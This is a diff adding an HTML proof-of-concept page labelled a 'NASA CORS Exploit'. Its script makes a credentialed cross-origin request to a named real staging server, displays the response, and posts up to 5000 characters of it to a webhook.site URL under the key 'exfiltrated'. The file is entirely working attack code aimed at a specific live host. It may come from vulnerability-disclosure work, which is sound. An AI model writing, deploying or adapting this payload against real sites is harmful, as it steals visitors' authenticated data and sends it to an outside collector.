@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🛰️ NASA CORS PoC</title>
+  <style>
+    body { background: black; color: lime; font-family: monospace; padding: 20px; }
+    pre { white-space: pre-wrap; word-break: break-word; }
+  </style>
+</head>
+<body>
+  <h2>🛰️ NASA CORS Exploit - Direct</h2>
+  <pre id="output">Initializing...</pre>
+
+  <script>
+    const target = "https://datasearchstaging.globe.gov/";
+    const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
+
+    fetch(target, {
+      method: "GET",
+      credentials: "include",
+      mode: "cors"
+    })
+    .then(response => response.text())
+    .then(data => {
+      document.getElementById("output").textContent = data.slice(0, 1000);
+      return fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          source: target,
+          exfiltrated: data.slice(0, 5000)
+        })
+      });
+    })
+    .catch(err => {
+      document.getElementById("output").textContent = "❌ ERROR:\n" + err;
+    });
+  </script>
+</body>
+</html>
